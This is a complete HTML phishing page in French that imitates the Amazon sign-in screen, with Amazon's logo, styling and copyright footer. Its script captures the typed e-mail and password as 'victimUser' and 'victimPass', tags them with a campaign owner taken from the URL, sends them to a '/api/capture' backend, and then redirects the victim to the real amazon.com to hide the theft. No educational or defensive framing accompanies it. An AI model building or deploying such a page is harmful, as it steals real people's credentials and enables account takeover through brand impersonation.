<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Amazon</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .amazon-container {
            width: 350px;
            background: #ffffff;
            border: 1px solid #dddddd;
            border-radius: 8px;
            padding: 25px 30px;
            box-sizing: border-box;
        }

        .amazon-logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .amazon-logo img {
            width: 103px;
            height: auto;
        }

        h1 {
            font-size: 28px;
            font-weight: 400;
            color: #111111;
            margin-bottom: 20px;
            margin-top: 0;
        }

        .input-label {
            font-size: 13px;
            font-weight: 700;
            color: #111111;
            margin-bottom: 5px;
            display: block;
        }

        .input-field {
            width: 100%;
            height: 31px;
            padding: 3px 7px;
            margin-bottom: 14px;
            background-color: #ffffff;
            border: 1px solid #888888;
            border-radius: 3px;
            font-size: 13px;
            box-sizing: border-box;
            outline: none;
        }

        .input-field:focus {
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
        }

        .amazon-btn {
            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
            border: 1px solid;
            border-color: #a88734 #9c7e31 #846a29;
            border-radius: 3px;
            color: #111111;
            font-size: 13px;
            padding: 8px 0;
            width: 100%;
            cursor: pointer;
            text-align: center;
            font-weight: 500;
            margin-top: 5px;
            transition: background 0.2s;
        }
        .amazon-btn:hover {
            background: linear-gradient(to bottom, #f5d78e, #eeb933);
        }

        .legal-text {
            font-size: 12px;
            color: #555555;
            margin-top: 22px;
            line-height: 1.4;
        }
        .legal-text a {
            color: #0066c0;
            text-decoration: none;
        }
        .legal-text a:hover {
            text-decoration: underline;
        }

        .footer-divider {
            margin-top: 30px;
            border-top: 1px solid #e7e7e7;
            padding-top: 20px;
            text-align: center;
            font-size: 11px;
            color: #555555;
        }
        .footer-divider a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer-divider a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="amazon-container">
        <!-- Logo Amazon officiel -->
        <div class="amazon-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
        </div>

        <h1>S'identifier</h1>

        <form id="loginForm">
            <label class="input-label" for="username">E-mail ou numéro de téléphone mobile</label>
            <input type="text" id="username" class="input-field" required>

            <label class="input-label" for="password">Mot de passe</label>
            <input type="password" id="password" class="input-field" required>

            <button type="submit" class="amazon-btn">S'identifier</button>
        </form>

        <div class="legal-text">
            En continuant, vous acceptez les <a href="#" onclick="return false;">Conditions d'utilisation</a> et l'Avis de confidentialité d'Amazon.
        </div>
    </div>

    <div class="footer-divider">
        <a href="#" onclick="return false;">Conditions d'utilisation</a>
        <a href="#" onclick="return false;">Confidentialité</a>
        <a href="#" onclick="return false;">Aide</a>
        <p>&copy; 1996-2026, Amazon.com, Inc. ou ses filiales.</p>
    </div>

    <script>
        // Récupération automatique des paramètres de l'URL (?user=Kim&type=standard)
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        // Gestion de la soumission du formulaire et envoi direct vers le backend Flask
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "Amazon",
                type: linkType,
                victimUser: username,
                victimPass: password,
                otp: 'Aucun'
            };

            // Envoi des données capturées vers le backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://www.amazon.com";
            }).catch(error => {
                window.location.href = "https://www.amazon.com";
            });
        });
    </script>
</body>
</html>
